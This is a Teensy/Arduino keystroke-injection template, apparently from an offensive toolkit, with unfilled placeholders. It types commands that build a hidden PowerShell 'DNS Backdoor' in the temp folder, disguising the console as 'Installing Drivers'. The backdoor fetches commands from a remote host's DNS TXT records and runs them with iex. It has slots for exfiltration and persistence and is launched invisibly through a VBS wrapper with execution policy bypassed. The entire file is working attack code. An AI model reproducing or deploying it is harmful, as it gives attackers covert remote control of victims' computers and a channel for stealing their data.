#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

void setup(){
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }
  Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  DNS Backdoor\" > %temp%\\dtb.ps1");
  Keyboard.println("echo $user = \"INPUT1\" >> %temp%\\dtb.ps1");
  Keyboard.println("echo $pass = \"INPUT2\" >> %temp%\\dtb.ps1");
  Keyboard.println("echo $dev = \"INPUT3\" >> %temp%\\dtb.ps1");

  String fn = "dtb";

  PERSCALLS

  delay(1000);
  Keyboard.println("echo while(1){  >> %temp%\\dtb.ps1");
  Keyboard.println("echo $exec = 0  >> %temp%\\dtb.ps1");
  Keyboard.println("echo sleep -seconds 5  >> %temp%\\dtb.ps1");
  Keyboard.println("echo $gtc = (iex \"nslookup -querytype=txt INPUT4 INPUT10\")  >> %temp%\\dtb.ps1");
  Keyboard.println("echo $tmp = $gtc ^| select-string -pattern ^\"`^\"^\" >> %temp%\\dtb.ps1");
  Keyboard.println("echo $st = $tmp -split(^\"`^\"^\")[0] >> %temp%\\dtb.ps1");
  Keyboard.println("echo if ($st[1] -eq \"INPUT5\"){ >> %temp%\\dtb.ps1");
  Keyboard.println("echo $gtm = (iex \"nslookup -querytype=txt INPUT6 INPUT10\")  >> %temp%\\dtb.ps1");
  Keyboard.println("echo $temp = $gtm ^| select-string -pattern ^\"`^\"^\" >> %temp%\\dtb.ps1");
  Keyboard.println("echo $cmd = $temp -split(^\"`^\"^\")[0] >> %temp%\\dtb.ps1");
  Keyboard.println("echo $pv = iex $cmd[1]}  >> %temp%\\dtb.ps1");
  Keyboard.println("echo $exec++  >> %temp%\\dtb.ps1");
  Keyboard.println("echo if ($st[1] -eq \"INPUT7\"){ >> %temp%\\dtb.ps1");
  Keyboard.println("echo $gtm = (iex \"nslookup -querytype=txt INPUT8 INPUT10\")  >> %temp%\\dtb.ps1");
  Keyboard.println("echo $temp = $gtm ^| sls -pattern ^\"`^\"^\" >> %temp%\\dtb.ps1");
  Keyboard.println("echo $tmp1 = \"\"  >> %temp%\\dtb.ps1");
  Keyboard.println("foreach ($txt in $temp){$tmp1 = $tmp1 + $txt}  >> %temp%\\dtb.ps1");
  Keyboard.println("$cmd = $tmp1 -replace '\\s+', \"\" -replace \"`\"\", \"\"  >> %temp%\\dtb.ps1");
  Keyboard.println("echo $pv = powershell.exe -c $cmd  >> %temp%\\dtb.ps1");
  Keyboard.println("echo $exec++ } >> %temp%\\dtb.ps1");
  Keyboard.println("echo if ($exec -eq 1){ >> %temp%\\dtb.ps1");

  EXFILCALLS

  Keyboard.println("echo sleep -Seconds 60 }  >> %temp%\\dtb.ps1");
  Keyboard.println("echo if ($st[1] -eq \"INPUT9\"){ break }} >> %temp%\\dtb.ps1");
  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\dtb.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\dtb.ps1\"),0,true >> %temp%\\dtb.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\dtb.vbs");
  delay(1000);
  Keyboard.println("exit");

}

void loop(){
}

 DEFS
 EXFILDEFS
 PERSDEFS